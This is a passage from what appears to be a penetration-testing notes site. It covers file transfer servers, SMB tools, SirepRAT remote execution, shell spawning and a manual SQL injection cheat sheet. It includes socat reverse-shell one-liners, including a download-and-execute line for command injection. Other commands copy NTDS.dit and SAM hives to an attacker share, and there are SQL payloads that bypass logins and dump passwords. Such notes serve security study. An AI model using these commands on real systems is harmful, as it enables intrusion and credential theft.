/var/www/uploads/SecretUploadDirectory\n\n# Create Nginx Configuration File by creating the file /etc/nginx/sites-available/upload.conf with the contents:\nserver {\n    listen 9001;\n\n    location /SecretUploadDirectory/ {\n        root    /var/www/uploads;\n        dav_methods PUT;\n    }\n}\n\n# Symlink our Site to the sites-enabled Directory\nsudo ln -s /etc/nginx/sites-available/upload.conf /etc/nginx/sites-enabled/\n\n# Start Nginx\nsudo systemctl restart nginx.service\n\n# If we get any error messages, check /var/log/nginx/error.log. we might see, for instance, port 80 is already in use.\n</code></pre> <p>Debuggin nginx:</p> <p>First check: ensure the directory listing is not enabled by navigating to http://localhost/SecretUploadDirectory</p> <p>Second check: Is default port in nginx already in use?</p> <pre><code># Verifying Errors\ntail -2 `/var/log/nginx/error.log`\n# and we might check that port 80 could not be binded because is already in use\n\n# See which service is using port 80\nss -lnpt | grep 80\n# we will obtain the service and also the pid. For instance `2811`\n\n# Check pid, for instance pid 2811, and see who is running it\nps -ef | grep \"2811\"\n\n# Remove NginxDefault Configuration to get around this, we can remove the default Nginx configuration, which binds on port 80.\nsudo rm /etc/nginx/sites-enabled/default\n</code></pre> <p>Finally you can copy to your nginx server all files you want to transfer with curl:</p> <pre><code>curl -T file.txt\n# -T, --upload-file &lt;file&gt;; This transfers the specified local file to the remote URL. -T uses PUT http method\n</code></pre>","tags":["servers","file transfer"]},{"location":"servers/#simple-python-server","title":"Simple python server","text":"<pre><code># Creating a Web Server with Python3\ncd /tmp\npython3 -m http.server 8000\n\n# Creating a Web Server with Python2.7\npython2.7 -m SimpleHTTPServer\n</code></pre>","tags":["servers","file transfer"]},{"location":"servers/#php-web-server","title":"PHP web server","text":"<pre><code>php -S 0.0.0.0:8000\n</code></pre>","tags":["servers","file transfer"]},{"location":"servers/#ruby-web-server","title":"Ruby Web Server","text":"<pre><code>ruby -run -ehttpd . -p8000\n</code></pre>","tags":["servers","file transfer"]},{"location":"servers/#uploadserver","title":"uploadserver","text":"<p>More at uploadserver.</p> <p>Python's http.server extended to include a file upload page. Accepts the same options as http.server, plus a couple extras.</p> <p>After the server starts, the upload page is at /upload. For example, if the server is running at http://localhost:8000/ go to http://localhost:8000/upload .</p> <p>Warning: This is an upload server, and running it will allow uploads.</p> <p>Repo: https://github.com/Densaugeo/uploadserver</p> <p>Installation:</p> <pre><code>python3 -m pip install --user uploadserver\n</code></pre> <p>Basic usage:</p> <pre><code>python3 -m uploadserver\n</code></pre>","tags":["servers","file transfer"]},{"location":"servers/#openssl","title":"openssl","text":"<p>Create a certificate in the attacker's machine:</p> <pre><code>openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out certificate.pem\n</code></pre> <p>Launch the openssl server in the attacker's machine:</p> <pre><code>openssl s_server -quiet -accept $portAttacker -cert certificate.pem -key key.pem &lt; /tmp/LinEnum.sh\n</code></pre> <p>Next, with the server running, we need to download the file from the compromised machine. So, download the file from the victim's machine:</p> <pre><code>openssl s_client -connect $ipAttacker:$portAttacker -quiet &gt; LinEnum.sh\n</code></pre>","tags":["servers","file transfer"]},{"location":"setting-up-mobile-penstesting/","title":"Setting up the mobile pentesting environment","text":"<p>Instructions</p> <ol> <li>Start by installing drozer.</li> <li>Install frida and, also, Burp certificate in frida.</li> <li>Install apktool.</li> <li>Install Objection.</li> </ol> <p>Nice-to-have tools</p> <ol> <li>Mobile Security Framework: MobSF.</li> <li>mobsfscan.</li> </ol> <p>ADB (Android Debug Bridge) cheat sheet.</p>","tags":["mobile pentesting"]},{"location":"setting-up-mobile-penstesting/#resources","title":"Resources","text":"<p>https://medium.com/@lightbulbr/how-to-root-an-android-emulator-with-tiramisu-android-13-f070a756c499</p> <p>Install Java JDK: https://wiki.centos.org/HowTos(2f)JavaDevelopmentKit.html</p>","tags":["mobile pentesting"]},{"location":"sharpview/","title":"SharpView","text":"<p>(C#)   - Doesn't support filtering using Pipeline\u00a0 SharpView is a .NET port of \u00a0PowerView. Many of the same functions supported by PowerView can be used with SharpView.</p>","tags":["active directory","ldap","windows","enumeration","reconnaissance","tools"]},{"location":"sharpview/#installation","title":"Installation","text":"<p>Download github repo from: https://github.com/tevora-threat/SharpView/.</p>","tags":["active directory","ldap","windows","enumeration","reconnaissance","tools"]},{"location":"sharpview/#basic-commands","title":"Basic commands","text":"<pre><code># Obtain help about a command\n\\SharpView.exe Get-DomainUser -Help\n\n# Get information about a given user\n.\\SharpView.exe Get-DomainUser -Identity $username\n</code></pre>","tags":["active directory","ldap","windows","enumeration","reconnaissance","tools"]},{"location":"shodan/","title":"shodan","text":"<p>Shodan can be used to find devices and systems permanently connected to the Internet like Internet of Things (IoT). It searches the Internet for open TCP/IP ports and filters the systems according to specific terms and criteria. For example, open HTTP or HTTPS ports and other server ports for FTP, SSH, SNMP, Telnet, RTSP, or SIP are searched. As a result, we can find devices and systems, such as surveillance cameras, servers, smart home systems, industrial controllers, traffic lights and traffic controllers, and various network components.</p>"},{"location":"shodan/#search-parameters","title":"Search parameters","text":"<pre><code>country:\ncity:\ngeo:\nhostname:\nnet:\nos:\nport:\nbefore: / after:\n</code></pre>"},{"location":"shodan/#example-shodan-for-enumeration","title":"Example: shodan for enumeration","text":"<p>Content from Pentesting notes:</p> <p>crt.sh: it enables the verification of issued digital certificates for encrypted Internet connections. This is intended to enable the detection of false or maliciously issued certificates for a domain.</p> <pre><code># Get all subdomais with that digital certificate\ncurl -s https://crt.sh/\\?q\\=example.com\\&amp;output\\=json | jq .\n\n# Filter all by unique subdomain\ncurl -s https://crt.sh/\\?q\\=example.com\\&amp;output\\=json | jq . | grep name | cut -d\":\" -f2 | grep -v \"CN=\" | cut -d'\"' -f2 | awk '{gsub(/\\\\n/,\"\\n\");}1;' | sort -u\n\n# With the list of unique subdomains, list all the Company hosted servers\nfor i in $(cat subdomainlist);do host $i | grep \"has address\" | grep example.com | cut -d\" \" -f4 &gt;&gt; ip-addresses.txt;done\n</code></pre> <p>Shodan:  Once we see which hosts can be investigated further, we can generate a list of IP addresses with a minor adjustment to the <code>cut</code> command and run them through <code>Shodan</code>.</p> <pre><code>for i in $(cat ip-addresses.txt);do shodan host $i;done\n</code></pre> <p>Go to Pentesting notes to pursuit DNS enumeration.</p>"},{"location":"sireprat/","title":"SirepRAT - RCE as SYSTEM on Windows IoT Core","text":"<p>SirepRAT\u00a0Features full RAT capabilities without the need of writing a real RAT malware on target.</p> <p>https://github.com/SafeBreach-Labs/SirepRAT#context)</p>","tags":["windows","rce"]},{"location":"sireprat/#installation","title":"Installation","text":"<pre><code># Download the repository\ngit clone https://github.com/SafeBreach-Labs/SirepRAT.git\n\n# Run the installation\npip install -r requirements.txt\n</code></pre>","tags":["windows","rce"]},{"location":"sireprat/#basic-usage","title":"Basic usage","text":"","tags":["windows","rce"]},{"location":"sireprat/#usage","title":"Usage","text":"<pre><code># Download File bash\npython SirepRAT.py $ip GetFileFromDevice --remote_path \"C:\\Windows\\System32\\drivers\\etc\\hosts\" --v\n\n# Upload File\npython SirepRAT.py $ip PutFileOnDevice --remote_path \"C:\\Windows\\System32\\uploaded.txt\" --data \"Hello IoT world!\"\n\n# Run Arbitrary Program\npython SirepRAT.py $ip LaunchCommandWithOutput --return_output --cmd \"C:\\Windows\\System32\\hostname.exe\"\n\n# With arguments, impersonated as the currently logged on user:\npython SirepRAT.py $ip LaunchCommandWithOutput --return_output --as_logged_on_user --cmd \"C:\\Windows\\System32\\cmd.exe\" --args \" /c echo {{userprofile}}\"\n\n# Try to run it without the\u00a0as_logged_on_user\u00a0flag to demonstrate the SYSTEM execution capability)\n# Get System Information\npython SirepRAT.py $ip GetSystemInformationFromDevice\n</code></pre>","tags":["windows","rce"]},{"location":"sireprat/#get-file-information","title":"Get File Information","text":"<pre><code>python SirepRAT.py 192.168.3.17 GetFileInformationFromDevice --remote_path \"C:\\Windows\\System32\\ntoskrnl.exe\"\n</code></pre>","tags":["windows","rce"]},{"location":"sireprat/#see-help-for-full-details","title":"See help for full details:","text":"<pre><code>python SirepRAT.py --help\n</code></pre>","tags":["windows","rce"]},{"location":"sireprat/#author","title":"Author","text":"","tags":["windows","rce"]},{"location":"sireprat/#related-labs","title":"Related Labs","text":"","tags":["windows","rce"]},{"location":"smbclient/","title":"smbclient - A tool for interacting with smb shares","text":"<p>See Quick Cheat sheet for smbclient.</p>","tags":["smb","port 445","port 137","port 138","port 139","samba","tools"]},{"location":"smbclient/#smbclient-installation","title":"smbclient installation","text":"<pre><code>sudo apt-get install smbclient\n</code></pre>","tags":["smb","port 445","port 137","port 138","port 139","samba","tools"]},{"location":"smbclient/#smbclient-configuration","title":"smbclient configuration","text":"<p>Default settings are in <code>/etc/samba/smb.conf</code>.</p> <pre><code> cat /etc/samba/smb.conf | grep -v \"#\\|\\;\" \n</code></pre> Setting Description <code>[sharename]</code> The name of the network share. <code>workgroup = WORKGROUP/DOMAIN</code> Workgroup that will appear when clients query. <code>path = /path/here/</code> The directory to which user is to be given access. <code>server string = STRING</code> The string that will show up when a connection is initiated. <code>unix password sync = yes</code> Synchronize the UNIX password with the SMB password? <code>usershare allow guests = yes</code> Allow non-authenticated users to access defined shared? <code>map to guest = bad user</code> What to do when a user login request doesn't match a valid UNIX user? <code>browseable = yes</code> Should this share be shown in the list of available shares? <code>guest ok = yes</code> Allow connecting to the service without using a password? <code>read only = yes</code> Allow users to read files only? <code>create mask = 0700</code> What permissions need to be set for newly created files? <p>For pentesting notes on ports 137, 138, 139 and 445 with a smb service, see 137-138-139-445-smb. </p>","tags":["smb","port 445","port 137","port 138","port 139","samba","tools"]},{"location":"smbclient/#smbclient-connection","title":"smbclient connection","text":"<p>See  <pre><code># [-L|--list=HOST] : Selecting the targeted host for the connection request.\nsmbclient -L -N //$ip\n# -N: Suppresses the password prompt.\n# -L: retrieve a list of available shares on the remote host\n</code></pre></p> <p>Smbclient will attempt to connect to the remote host and check if there is any authentication required. If there is, it will ask you for a user and a password for your local username. If we do not specify a specific username to smbclient when attempting to connect to the remote host, it will just use your local machine's username.If vulnerable and performing a Null Attack, we will hit Enter when prompted for a password.</p> <p>After authenticating, we may obtain access to some typical shared folders, such as:</p> <pre><code>ADMIN$ - Administrative shares are hidden network shares created by the Windows NT family of operating systems that allow system administrators to have remote access to every disk volume on a network-connected system. These shares may not be permanently deleted but may be disabled.\n\nC$ - Administrative share for the C:\\ disk volume. This is where the operating system is hosted.\n\nIPC$ - The inter-process communication share. Used for inter-process communication via named pipes and is not part of the file system.\nWorkShares - Custom share. \n</code></pre> <p>We will try to connect to each of the shares except for the IPC$ one, which is not valuable for us since it is not browsable as any regular directory would be and does not contain any files that we could use at this stage of our learning experience:  <pre><code># the use of / and \\ might be different if you need to escape some characters\nsmbclient \\\\\\\\$ip\\\\ADMIN$\n</code></pre></p> <p>Important: Sometimes some jugling is needed:</p> <pre><code>smbclient -N -L \\\\$ip\nsmbclient -N -L \\\\\\\\$ip\nsmbclient -N -L /\\/\\$ip\n</code></pre> <p>If we have NT_STATUS_ACCESS_DENIED as output, we do not have the proper credentials to connect to this share. </p> <p>Connect to a Shared folders as Administrator:</p> <pre><code>smbclient -L 10.129.228.98 -U Administrator\n</code></pre> <p>Also we can use rpcclient tool for connecting to the shared folders.</p>","tags":["smb","port 445","port 137","port 138","port 139","samba","tools"]},{"location":"smbclient/#basic-commands-in-smbclient","title":"Basic commands in SMBclient","text":"<pre><code># Show available commands\nhelp\n\n# Download a file\nget &lt;file&gt;\n\n# See status\nsmbstatus\n\n# Smbclient also allows us to execute local system commands using an exclamation mark at the beginning (`!&lt;cmd&gt;`) without interrupting the connection.\n!cmd\n\n!cat prep-prod.txt\n</code></pre>","tags":["smb","port 445","port 137","port 138","port 139","samba","tools"]},{"location":"smbclient/#quick-cheat-sheet","title":"Quick cheat sheet","text":"<pre><code># List shares on a machine using NULL Session\nsmbclient -L &lt;target-IP&gt;\n\n# List shares on a machine using a valid username + password\nsmbclient -L \\&lt;target-IP\\&gt; -U username%password\n\n# Connect to a valid share with username + password\nsmbclient //\\&lt;target\\&gt;/\\&lt;share$\\&gt; -U username%password\n\n# List files on a specific share\nsmbclient //\\&lt;target\\&gt;/\\&lt;share$\\&gt; -c 'ls' password -U username\n\n# List files on a specific share folder inside the share\nsmbclient //\\&lt;target\\&gt;/\\&lt;share$\\&gt; -c 'cd folder; ls' password -U username\n\n# Download a file from a specific share folder\nsmbclient //\\&lt;target\\&gt;/\\&lt;share$\\&gt; -c 'cd folder;get desired_file_name' password -U username\n\n# Copy a file to a specific share folder\nsmbclient //\\&lt;target\\&gt;/\\&lt;share$\\&gt; -c 'put /var/www/my_local_file.txt .\\target_folder\\target_file.txt' password -U username\n\n# Create a folder in a specific share folder\nsmbclient //\\&lt;target\\&gt;/\\&lt;share$\\&gt; -c 'mkdir .\\target_folder\\new_folder' password -U username\n\n# Rename a file in a specific share folder\nsmbclient //\\&lt;target\\&gt;/\\&lt;share$\\&gt; -c 'rename current_file.txt new_file.txt' password -U username\n</code></pre>","tags":["smb","port 445","port 137","port 138","port 139","samba","tools"]},{"location":"smbmap/","title":"SMBMap","text":"<p>SMBMap allows users to enumerate samba share drives across an entire domain. List share drives, drive permissions, share contents, upload/download functionality, file name auto-download pattern matching, and even execute remote commands.</p>","tags":["smb","pass-the-hash","file upload","rce","tools"]},{"location":"smbmap/#installation","title":"Installation","text":"<p>Installation from https://github.com/ShawnDEvans/smbmap</p> <pre><code>sudo pip3 install smbmap\nsmbmap\n</code></pre>","tags":["smb","pass-the-hash","file upload","rce","tools"]},{"location":"smbmap/#basic-usage","title":"Basic usage","text":"<pre><code># Enumerate network shares and access associated permissions.\nsmbmap -H $ip\n\n# # Enumerate network shares and access associated permissions with recursivity\nsmbmap -H $ip -r\n\n# Chack access and permissions level for a folder with recursion\nsmbmap -u $username -p $password -d $domain -H $ip -R $nameofFolder --dir-only\n# --dir-only: provides only the output of all directories and did not list all files.\n\n# Download a file from a specific share folder\nsmbmap -H $ip --download \"folder\\file.txt\"\n\n# Upload a file to a specific share folder\nsmbmap -H $ip --upload originfile.txt \"targetfolder\\file.txt\"\n</code></pre>","tags":["smb","pass-the-hash","file upload","rce","tools"]},{"location":"smbserver/","title":"smbserver - from impacket","text":"<p>Simple SMB Server example. See impacket.</p>","tags":["pentesting windows","server","impacket"]},{"location":"smbserver/#installation","title":"Installation","text":"<p>Download from: https://github.com/fortra/impacket/blob/master/examples/smbserver.py</p>","tags":["pentesting windows","server","impacket"]},{"location":"smbserver/#basic-usage","title":"Basic usage","text":"","tags":["pentesting windows","server","impacket"]},{"location":"smbserver/#create-a-share-server-in-attacker-machine-and-connect-from-victims","title":"Create a share server in attacker machine and connect from victim's","text":"<p>Launch smbserver in our attacker machine:</p> <pre><code>sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData /home/username/Documents/\n</code></pre> <p>Also you can launch it with username and password:</p> <pre><code>sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData /home/username/Documents/ -username \"username\" -password \"agreatpassword\"\n</code></pre> <p>Now, from PS in the victim's windows machine we could upload a folder to the shared folder in the attacker machine just by running:</p> <pre><code>cmd.exe /c move C:\\NTDS\\NTDS.dit \\\\$ip\\CompData\n</code></pre> <p>Sidenote: see the HackTheBox machine Omni, which uses SirepRAT to upload files to the share. A taste of it:</p> <pre><code># First crate the shared. After that, establish the connection:\npython ~/tools/SirepRAT/SirepRAT.py $ip LaunchCommandWithOutput --return_output --cmd \"C:\\Windows\\System32\\cmd.exe\" --args ' /c net use \\\\10.10.14.2\\CompData /u:username agreatpassword'\n\n# Now copy files to the share. In this case we are dumping Hives \npython ~/tools/SirepRAT/SirepRAT.py $ip LaunchCommandWithOutput --return_output --cmd \"C:\\Windows\\System32\\cmd.exe\" --args ' /c reg save HKLM\\sam \\\n\\10.10.14.2\\CompData\\sam'\n</code></pre>","tags":["pentesting windows","server","impacket"]},{"location":"snaffler/","title":"Snaffler, a tool for enumerating creds and shares in Active Directory","text":"<p>Snaffler\u00a0is a tool for\u00a0pentesters\u00a0and\u00a0red teamers\u00a0to help find delicious candy needles (creds mostly, but it's flexible) in a bunch of horrible boring haystacks (a massive Windows/AD environment). Broadly speaking\u00a0- it gets a list of Windows computers from Active Directory, then spreads out its snaffly appendages to them all to figure out which ones have file shares, and whether you can read them.</p>","tags":["tools","windows","rdp"]},{"location":"snaffler/#basic-usage","title":"Basic usage","text":"<pre><code>Snaffler.exe -s -d $domain -o snaffler.log -v data\n# -s:  prints results to the console \n# -d: specifies the domain to search within\n# -o: writes results to a logfile\n# -v: verbosity level. \"data\" is best as it only displays results to the screen\n</code></pre>","tags":["tools","windows","rdp"]},{"location":"snmpwalk/","title":"snmpwalk - SNMP scanner","text":"<p>See SNMP for details about the protocol.</p> <p>Snmpwalk is used to query the OIDs with their information. It retrieves a subtree of management values using SNMP GETNEXT requests.</p>","tags":["enumeration","snmp","port 161","tools"]},{"location":"snmpwalk/#installation","title":"Installation","text":"<pre><code>sudo apt-get install snmp\n</code></pre>","tags":["enumeration","snmp","port 161","tools"]},{"location":"snmpwalk/#basic-usage","title":"Basic usage","text":"<pre><code>snmpwalk -v2c -c public $ip\n</code></pre> <pre><code>snmpwalk -v 2c -c public $ip 1.3.6.1.2.1.1.5.0\n</code></pre> <pre><code>snmpwalk -v 2c -c private $ip\n</code></pre> <p>If we do not know the community string, we can use onesixtyone and SecLists wordlists to identify these community strings.</p>","tags":["enumeration","snmp","port 161","tools"]},{"location":"spawn-a-shell/","title":"Spawn a shell","text":"All about shells Shell Type Description <code>Reverse shell</code> Initiates a connection back to a \"listener\" on our attack box. <code>Bind shell</code> \"Binds\" to a specific port on the target host and waits for a connection from our attack box. <code>Web shell</code> Runs operating system commands via the web browser, typically not interactive or semi-interactive. It can also be used to run single commands (i.e., leveraging a file upload vulnerability and uploading a\u00a0<code>PHP</code>\u00a0script to run a single command. <p>Webshell is a script written in a language that is executed by a server. Web shell are not fully interactive. </p> Resources for upgrading simple shells <ul> <li>https://sushant747.gitbooks.io/total-oscp-guide/content/spawning_shells.html.</li> <li>Cheat sheet.</li> <li>Shell creation.</li> <li>About webshells.</li> </ul> <p>Sidenote: Also, you can generate a webshell by using\u00a0 msfvenom</p>","tags":["pentesting","terminal","shells"]},{"location":"spawn-a-shell/#clasification-of-shells","title":"Clasification of shells","text":"<p>On a Linux system, the shell is a program that takes input from the user via the keyboard and passes these commands to the operating system to perform a specific function.</p> <p>There are three main types of shell connections:</p> Shell Type Description Reverse shell Initiates a connection back to a \"listener\" on our attack box. Bind shells \"Binds\" to a specific port on the target host and waits for a connection from our attack box. Web shells Runs operating system commands via the web browser, typically not interactive or semi-interactive. It can also be used to run single commands (i.e., leveraging a file upload vulnerability and uploading a PHP script to run a single command.","tags":["pentesting","terminal","shells"]},{"location":"spawn-a-shell/#spawn-a-shell_1","title":"Spawn a shell","text":"","tags":["pentesting","terminal","shells"]},{"location":"spawn-a-shell/#awk","title":"awk","text":"<pre><code>awk 'BEGIN {system(\"/bin/sh\")}'\n</code></pre>","tags":["pentesting","terminal","shells"]},{"location":"spawn-a-shell/#bash","title":"bash","text":"<pre><code># Upgrade shell with running these commands all at once:\n\nSHELL=/bin/bash script -q /dev/null\nCtrl-Z\nstty raw -echo\nfg\nreset\nxterm\n</code></pre> <pre><code>bash -i\n\n# Using echo\necho 'os.system('/bin/bash')'\n</code></pre>","tags":["pentesting","terminal","shells"]},{"location":"spawn-a-shell/#find","title":"find","text":"<pre><code>find / -name nameoffile -exec /bin/awk 'BEGIN {system(\"/bin/sh\")}' \\;\n# This use of the find command is searching for any file listed after the -name option, then it executes awk (/bin/awk) and runs the same script we discussed in the awk section to execute a shell interpreter.\n\nfind . -exec /bin/sh \\; -quit\n# This use of the find command uses the execute option (-exec) to initiate the shell interpreter directly. If find can't find the specified file, then no shell will be attained.\n</code></pre>","tags":["pentesting","terminal","shells"]},{"location":"spawn-a-shell/#lua","title":"lua","text":"<pre><code>lua: os.execute(\u2018/bin/sh\u2019)\n</code></pre>","tags":["pentesting","terminal","shells"]},{"location":"spawn-a-shell/#msfvenom","title":"msfvenom","text":"<p>You can generate a webshell by using\u00a0 msfvenom</p> <pre><code># List payloads\nmsfvenom --list payloads | grep x64 | grep linux | grep reverse\u00a0\u00a0\n</code></pre> <p>Also msfvenom can use metasploit payloads under \u201ccmd/unix\u201d  to generate one-liner bind or reverse shells. List options with:</p> <pre><code>msfvenom -l payloads | grep \"cmd/unix\" | awk '{print $1}'\n</code></pre>","tags":["pentesting","terminal","shells"]},{"location":"spawn-a-shell/#perl","title":"perl","text":"<pre><code>perl -e 'exec \"/bin/sh\";'\n\nperl:\u00a0 exec \"/bin/sh\";\n</code></pre>","tags":["pentesting","terminal","shells"]},{"location":"spawn-a-shell/#python","title":"python","text":"<pre><code> # using python for a pseudo terminal\npython -c 'import os; os.system(\"/bin/sh\")'\n</code></pre> <pre><code> # using python for a pseudo terminal\npython -c 'import pty; pty.spawn(\"/bin/bash\")'\n\npython3 -c \"import pty;pty.spawn('/bin/bash')\"\n</code></pre>","tags":["pentesting","terminal","shells"]},{"location":"spawn-a-shell/#ruby","title":"ruby","text":"<pre><code>ruby:\u00a0 exec \"/bin/sh\";\n</code></pre>","tags":["pentesting","terminal","shells"]},{"location":"spawn-a-shell/#ssh","title":"ssh","text":"<pre><code>/bin/sh -i\n</code></pre>","tags":["pentesting","terminal","shells"]},{"location":"spawn-a-shell/#socat","title":"socat","text":"<pre><code># Listener:\nsocat file:`tty`,raw,echo=0 tcp-listen:4444\n\n#Victim:\nsocat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444\n</code></pre> <p>If socat isn\u2019t installed, there exists other options. There are standalone binaries that can be downloaded from this Github repo: https://github.com/andrew-d/static-binaries</p> <p>With a command injection vuln, it\u2019s possible to download the correct architecture <code>socat</code> binary to a writable directoy, chmod it, then execute a reverse shell in one line:</p> <pre><code>wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444\n</code></pre> <p>On Kali, run:</p> <pre><code>socat file:`tty`,raw,echo=0 tcp-listen:4444\n</code></pre> <p>and you\u2019ll catch a fully interactive TTY session. It supports tab-completion, SIGINT/SIGSTP support, vim, up arrow history, etc. It\u2019s a full terminal. </p>","tags":["pentesting","terminal","shells"]},{"location":"spawn-a-shell/#stty-options","title":"stty options","text":"<pre><code># In reverse shell\n$ python -c 'import pty; pty.spawn(\"/bin/bash\")'\n\n# Ctrl-Z\n\n\n# In Kali\n$ stty raw -echo\n$ fg\n</code></pre> <pre><code># In reverse shell\nreset\nexport SHELL=bash\nexport TERM=xterm-256color\nstty size\nstty rows &lt;num&gt; columns &lt;cols&gt;\n\n# In one line:\nreset; export SHELL=bash; export TERM=xterm-256color; stty rows &lt;num&gt; columns &lt;cols&gt;\n</code></pre>","tags":["pentesting","terminal","shells"]},{"location":"spawn-a-shell/#vim","title":"VIM","text":"<pre><code>vim -c ':!/bin/sh'\n</code></pre> <p>VIM escape:</p> <pre><code>vim\n:set shell=/bin/sh\n:shell\n</code></pre>","tags":["pentesting","terminal","shells"]},{"location":"sqli-manual-attack/","title":"SQLi Cheat sheet for manual injection","text":"<p>Resources</p> <ul> <li>See a more detailed explanation about SQL injection.</li> <li>PayloadsAllTheThings Original payloads for different SQL databases.</li> </ul> OWASP <p>OWASP Web Security Testing Guide 4.2 &gt; 7. Data Validation Testing &gt; 7.5. Testing for SQL Injection</p> ID Link to Hackinglife Link to OWASP Description 7.5 WSTG-INPV-05 Testing for SQL Injection - Identify SQL injection points.  - Assess the severity of the injection and the level of access that can be achieved through it. Languages and dictionaries Server Dictionary MySQL MySQL payloads. MSSQL MSSQL payloads. PostgreSQL PostgreSQL payloads. Oracle Oracle SQL payloads. SQLite SQLite payloads. Cassandra Cassandra payloads. Attack-based dictionaries <ul> <li>Generic SQL Injection Payloads</li> <li>Generic Error Based Payloads.</li> <li>Generic Union Select Payloads.</li> <li>SQL time based payloads .</li> <li>SQL Injection Auth Bypass Payloads </li> </ul>","tags":["pentesting"]},{"location":"sqli-manual-attack/#comment-injection","title":"Comment injection","text":"<p>Put a line comment at the end to comment out the rest of the query.</p> <p>Valid for MySQL, SQL Server, PostgreSQL, Oracle, SQLite:</p> <pre><code>-- comment      // MySQL [Note the space after the double dash]\n--comment       // MSSQL\n--comment       // PostgreSQL\n--comment       // Oracle\n\n\n/*comment*/     // MySQL\n/*comment*/     // MSSQL\n/*comment*/     // PostgreSQL\n\n#comment        // MySQL\n</code></pre>","tags":["pentesting"]},{"location":"sqli-manual-attack/#boolean-based-testing","title":"Boolean-based testing","text":"","tags":["pentesting"]},{"location":"sqli-manual-attack/#integer-based-parameter-injection","title":"Integer based parameter injection","text":"<p>Common in Integer based parameter injection such as:</p> <pre><code>URL: https://site.com/user.php?id=1\nSQL query: SELECT * FROM users WHERE id= FUZZ;\n</code></pre> <p>Typical payloads for that query:</p> <pre><code># Return true\nAND 1\nAnd true\n\n# Return False\nAND 0\nAnd false\n\n# Return 56 if vulnerable\n1*56\n\n# Return 1 if not vulnerable\n1*56\n</code></pre>","tags":["pentesting"]},{"location":"sqli-manual-attack/#string-based-parameter-injection","title":"String based parameter injection","text":"<pre><code>URL: https://site.com/user.php?id=alexis\nSQL query: SELECT * FROM users WHERE name= 'FUZZ';\n</code></pre> <p>Typical payloads for that query:</p> <pre><code># Return true\n''\n\"\"\n\n# Return false\n'\n\"\n</code></pre> <p>Exploiting single quote ('): In SQL, the single quote is used to delimit string literals. A way to exploit this is in a Login form:</p> <pre><code># SQL query\nSELECT * FROM users WHERE username = '&lt;username&gt;' AND password = '&lt;password&gt;'\n\n# Payload\n' OR '1'='1'; --\n\n# The attacker's injected SQL code ' OR '1'='1'; -- causes the condition '1'='1' to evaluate to true, effectively bypassing the\nauthentication mechanism. Modified query would became\nSELECT * FROM users WHERE username = '' OR '1'='1'; -- ' AND password = '&lt;password&gt;'\n</code></pre>","tags":["pentesting"]},{"location":"sqli-manual-attack/#error-based-testing","title":"Error-based testing","text":"Dictionaries <p>https://github.com/amandaguglieri/dictionaries/blob/main/SQL/error-based</p> <p>Firstly, every DBMS/RDBMS responds to incorrect/erroneous SQL queries with different error messages, so an error response can be use to fingerprint the database:</p> <p>A typical error from MS-SQL will look like this:</p> <pre><code>Incorrect syntax near [query snippet]\n</code></pre> <p>While a typical MySQL error looks more like this:</p> <pre><code>You have an error in your SQL syntax. Check the manual that corresponds\nto your MySQL server version for the right syntax to use near [query\nsnippet]\n</code></pre>","tags":["pentesting"]},{"location":"sqli-manual-attack/#union-attack","title":"UNION attack","text":"Dictionaries <p>https://github.com/amandaguglieri/dictionaries/blob/main/SQL/union-select</p>","tags":["pentesting"]},{"location":"sqli-manual-attack/#mysql","title":"MYSQL","text":"<pre><code>#########\nMYSQL\n#########\n\n# Access (using null characters)\n' OR '1'='1' %00\n' OR '1'='1' %16\n\n\n\n# 1. Bypass a form      \n1' OR '1'='1';#\n' OR '1'='1';#\n1' OR '1'='1';-- - \n' OR '1'='1';-- -  \n\n\n# 2. Number of columns (UNION attack)\n1' OR '1'='1' order by 1;#\n1' OR '1'='1' order by 2;#\n1' OR '1'='1' order by 3;#\n...\n# Do this until you get an error message and then you will know the number of columns\n# Another method to see the number of columns. \n' OR '1'='1' order by 1;-- -   \n\n# 3. Get which column is being displayed. For instance, when we know we have 6 columns:\n1' OR '1'='1' UNION SELECT 1,2,3,4,5,6;# \n\n# 4. Get names of all databases \n1' OR '1'='1' UNION SELECT null,table_schema,null,null,null,null,null FROM information_schema.tables;#\n# 4. Get names of all databases in SQLite (name and schema of the tables stored in the database).\na' or '1'='1' union select tbl_name,2,3,4,5 from sqlite_master --\n\n\n# 5. Get names of all tables from the selected database\n1' OR '1'='1' UNION SELECT null,table_name,null,null,null,null FROM information_schema.tables;# \n\n\n# 6. Get the name of all columns of a selected table from a selected database\n1' OR '1'='1' UNION SELECT null,column_name,null,null,null,null FROM information_schema.columns WHERE table_name='users';#\n\n\n# 7. Get the value of a selected column (for instance, password)\n1' OR '1'='1' UNION SELECT null,passwords,null,null,null,null FROM users;#\n\n1' OR '1'='1' UNION SELECT null,passwords,null,null,null,null FROM &lt;databaseName.tableName&gt;;#\n</code></pre> <p>Other interesting queries:</p> <pre><code>database()\nuser()\n@@version\nSLEEP(5)\ncurrent_user()\n</code></pre>","tags":["pentesting"]},{"location":"sqli-manual-attack/#sqlite","title":"SQLite","text":"<pre><code>#########\nSQLite\n#########\n\n# Ensure that the targeted parameter is vulnerable\n1' a' or '1'='1' --\n\n# Determine the number of columns of the query\n1' a' or '1'='1' order by 1 -- //returns all results\n1' a' or '1'='1' order by 2 -- //returns all results\n1' a' or '1'='1' order by 3 -- //returns all results\n1' a' or '1'='1' order by 4 -- //returns all results\n1' a' or '1'='1' order by 5 -- //returns all results\n1' a' or '1'='1' order by 6 -- //returns none\n# Therefore the query contains 5 columns.\n\n# Determine which columns are being returned\n1' a' or '1'='1' UNION SELECT 1,2,3,4,5 -- \n# The table in this demo returned values 1,3,4,5. Value 2 was not returned.\n\n# Extract version of sqlite database\n1' a' or '1'='1' UNION SELECT sqlite_version,NULL,NULL,NULL,NULL -- \n\n# Determine the name and schema of the tables stored in the database.\na' or '1'='1' union select tbl_name,2,3,4,5 from sqlite_master --\n\n# Determine the SQL command used to construct the tables:\na' or '1'='1' union select sql,2,3,4,5 from sqlite_master --\n# In this demo it returned:\n1   CREATE TABLE results (rollno text primary key, email text, name text, marks real, rank integer) 4   5\n1   CREATE TABLE secret_flag (flag text, value text)    4   5\n\n# Retrieve two 